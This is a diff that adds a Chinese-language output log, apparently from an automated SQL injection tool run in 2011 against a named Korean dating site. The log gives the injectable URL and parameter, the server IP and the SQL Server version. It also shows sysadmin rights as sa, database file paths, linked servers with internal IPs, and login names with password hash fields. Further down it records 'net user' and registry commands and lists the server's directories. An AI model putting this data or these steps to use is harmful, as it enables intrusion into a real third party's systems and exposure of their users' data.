@@ -1,0 +1,286 @@
+■漏洞信息:============================================================
+ ·URL:http://sms.joyhunting.com/help/newhelp_faq1_view.asp?cateid=1&num=294
+ ·页面标题： 炼捞清泼, 攫力唱 榴疤绊 亮篮父巢! 角矫埃 拳惑/盲泼 (www.joyhunting.com) 
+ ·参数:cateid=1&num=294
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.115.88.100
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 09:23:03 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Expires: 0
+Cache-Control: no-cache
+Pragma: no-cache
+Content-Length: 61938
+Content-Type: text/html
+Set-Cookie: tempUrl=%2Fhelp%2Fnewhelp%5Ffaq1%5Fview%2Easp; path=/
+Set-Cookie: JoyHunting=; domain=joyhunting.com; path=/
+Set-Cookie: ASPSESSIONIDACTRQDTA=KMBJEELAEBKEGOIFOOFHCOEN; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：Joyhunting
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2055 (Intel X86) 
+	Dec 16 2008 19:46:53 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：ANIJCLUSTER
+- 服务名：MSSQLSERVER
+- 系统用户名：sa
+
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+Anijcorp	E:\Microsoft SQL Server\MSSQL\data\Anijcorp_Data.MDF	
+GAMES	E:\Microsoft SQL Server\MSSQL\data\GAMES_Data.MDF	
+HelloStart	E:\Microsoft SQL Server\MSSQL\data\HelloStart_Data.MDF	
+humanfirst	E:\Microsoft SQL Server\MSSQL\data\humanfirst_Data.MDF	
+Joyhunting	E:\Microsoft SQL Server\MSSQL\data\Joyhunting_Data.MDF	
+Joyhunting_club	E:\Microsoft SQL Server\MSSQL\data\Joyhunting_club_Data.MDF	
+JoyHunting_Other	E:\Microsoft SQL Server\MSSQL\data\JoyHunting_Other_Data.MDF	
+master	E:\Microsoft SQL Server\MSSQL\data\master.mdf	
+MMSMO	E:\Microsoft SQL Server\MSSQL\data\MMSMO_Data.MDF	
+model	E:\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	E:\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	E:\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+PoeverDB	E:\Microsoft SQL Server\MSSQL\data\PoeverDB_Data.MDF	
+pubs	E:\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+tempdb	E:\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+test	E:\Microsoft SQL Server\MSSQL\data\test_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	ANIJCLUSTER	2156	AWAITING COMMAND	anijcorp	
+SQLAgent - Alert Engine	sleeping	ANIJCLUSTER	2156	AWAITING COMMAND	anijcorp	
+SQL 孽府 盒籍扁	sleeping	ANIJCORP-31A36F	3680	AWAITING COMMAND		
+MS SQLEM	sleeping	ANIJCORP-60D3FB	1552	AWAITING COMMAND		
+MS SQLEM	sleeping	ANIJCORP-60D3FB	1552	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+ANIJCLUSTER	SQL Server	SQLOLEDB	ANIJCLUSTER		ANIJCLUSTER	
+CHATSRV		SQLOLEDB	211.115.88.101			
+CHATSRV100		SQLOLEDB	211.115.88.100			
+PARTSRV119		SQLOLEDB	211.115.88.119			
+repl_distributor	SQL Server	SQLOLEDB	211.115.88.115		211.115.88.115	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+		0		05 26 2009  5:15PM	05 26 2009  5:15PM	
+anij_db		1	茄惫绢	05 27 2009  3:02PM	05 27 2009  3:02PM	
+ANIJCORPDBCLUST\anijcorp		1	茄惫绢	05 26 2009  5:14PM	05 26 2009  5:14PM	
+BUILTIN\Administrators		1	茄惫绢	05 26 2009  5:14PM	05 26 2009  5:14PM	
+distributor_admin		0		10 30 2009  7:21PM	10 30 2009  7:21PM	
+joy_other		13	茄惫绢	05 27 2009  3:02PM	05 27 2009  3:02PM	
+sa	鼙???啱急??????枃?卤鬼????嵎?	1	茄惫绢	08  6 2000  1:27AM	05 27 2009  3:00PM	
+sa	鼙???啱急??????枃?卤鬼????嵎?	1	茄惫绢	08  6 2000  1:27AM	05 27 2009  3:00PM	
+sa	鼙???啱急??????枃?卤鬼????嵎?	1	茄惫绢	08  6 2000  1:27AM	05 27 2009  3:00PM	
+sa	?佅?瞂?????细嘍?????癫	0		05 29 2009  9:21AM	05 29 2009  9:21AM	
+sagame		13	茄惫绢	05 27 2009  3:02PM	05 27 2009  3:02PM	
+sajoy		11	茄惫绢	05 27 2009  3:02PM	05 27 2009  3:02PM	
+sql_user	??????????鞘????帹?????	1	茄惫绢	12  8 2009 12:02AM	12  8 2009 12:02AM	
+sqluser	???羙?篛???????????淄皻??缒	1	茄惫绢	10 30 2010  7:45PM	10 30 2010  7:45PM	
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+■net user
+Dir of D:: 
+
+ibm_sw_ds3k_10353540_winsrvr_i386\
+ibm_sw_ds4kfc_09.60.xx.05_windows_intl386\
+RECYCLER\
+sql2kent\
+System Volume Information\
+sql2kent.zip
+WindowsServer2003-KB932755-x86-KOR.exe
+
+Dir of C:: 
+
+ADFS\
+Documents and Settings\
+drv\
+Intel\
+Program Files\
+RECYCLER\
+System Volume Information\
+UXLOG\
+w2k3sp2_3959_kor_x86fre_spcd\
+WINDOWS\
+wmpub\
+AUTOEXEC.BAT
+CONFIG.SYS
+regedit.exe
+wininst.txt
+
+Dir of C:\drv: 
+
+adpu320\
+asripmi\
+atirad2\
+bc\
+bcii\
+cs5\
+cs6\
+dds\
+drvutils\
+e1\
+e2\
+e3\
+is\
+iscsi\
+iscsinul\
+ixa1\
+ixa2\
+kb883646\
+lsi\
+lsisas\
+mr\
+mrsas\
+oipmidd\
+oipmiml\
+rsa2\
+sdlt\
+srsas\
+srscsi\
+DrvSet.ini
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+Dir of C:\Intel: 
+一次性获取失败，正在批次获取……
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+------------------------------------------------------------
+正在获取数据库 [Joyhunting] 的表名……
+一次性获取失败，正在批次获取……
+批次获取失败，正在逐条获取……
+取记录数失败，使用设定值：5
+
+
+
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前用户权限：
+获取用户权限失败！
